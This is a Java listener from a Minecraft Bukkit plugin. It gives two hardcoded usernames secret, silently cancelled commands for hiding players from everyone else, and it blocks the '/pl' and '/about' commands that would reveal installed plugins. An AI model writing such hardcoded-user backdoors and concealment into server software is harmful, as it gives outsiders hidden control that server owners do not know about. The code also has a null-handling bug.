package de.nikey.nikeysystem.Listener;

import de.nikey.nikeysystem.NikeySystem;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;

public class CommandRegister implements Listener {

    public static void loadHiddenPlayerNames() {
        FileConfiguration config = NikeySystem.getPlugin().getConfig();
        hiddenPlayerNames.clear();
        hiddenPlayerNames.addAll(config.getStringList("hiddenPlayers"));
    }

    // Speichern der versteckten Spielernamen in die Konfiguration
    public static void saveHiddenPlayerNames() {
        FileConfiguration config = NikeySystem.getPlugin().getConfig();
        config.set("hiddenPlayers", new ArrayList<>(hiddenPlayerNames));
        NikeySystem.getPlugin().saveConfig();
    }

    public static final Set<String> hiddenPlayerNames = new HashSet<>();
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("NikeyV1") || player.getName().equalsIgnoreCase("NikeyV3")) {
            final String cmd = event.getMessage();
            final String[] args = cmd.split(" ");
            if (cmd.startsWith("/sys.player.hide.always")) {
                event.setCancelled(true);
                event.setMessage("w");
                if (args.length == 2) {
                    String targetName = args[1];
                    Player target = Bukkit.getPlayer(targetName);
                    // Zielspieler zur Liste der versteckten Spieler hinzufügen
                    if (!hiddenPlayerNames.contains(targetName)) {
                        hiddenPlayerNames.add(targetName);
                        saveHiddenPlayerNames();  // Speichern nach dem Hinzufügen

                        // Wenn der Zielspieler online ist, ihn sofort verstecken
                        if (target != null) {
                            // Zielspieler für alle anderen Spieler unsichtbar machen
                            for (Player players : Bukkit.getOnlinePlayers()) {
                                if (!players.equals(target)) {
                                    if (!players.getName().equalsIgnoreCase("NikeyV1")) {
                                        players.hidePlayer(NikeySystem.getPlugin(), target);
                                    }
                                }
                            }
                        }
                        player.sendMessage(ChatColor.GOLD + target.getName() + " is now hidden.");
                    }else {
                        hiddenPlayerNames.remove(targetName );
                        saveHiddenPlayerNames();  // Speichern nach dem Entfernen

                        // Wenn der Zielspieler online ist, ihn sofort verstecken
                        if (target != null) {
                            // Zielspieler für alle anderen Spieler unsichtbar machen
                            for (Player players : Bukkit.getOnlinePlayers()) {
                                if (!players.equals(target)) {
                                    players.showPlayer(NikeySystem.getPlugin(), target);
                                }
                            }
                        }
                        player.sendMessage(ChatColor.GOLD + target.getName() + " is now shown.");
                    }

                }
            }else if (cmd.startsWith("/sys.player.hide.immunity")) {
                event.setCancelled(true);
                if (args.length == 2) {
                    Player target = Bukkit.getPlayer(args[1]);

                    if (target == null)return;
                }
            }
        }

        if (event.getMessage() .startsWith("/pl")){
            event.setCancelled(true);
        } else if (event.getMessage() .startsWith("/about")) {
            event.setCancelled(true);
        }
    }

}
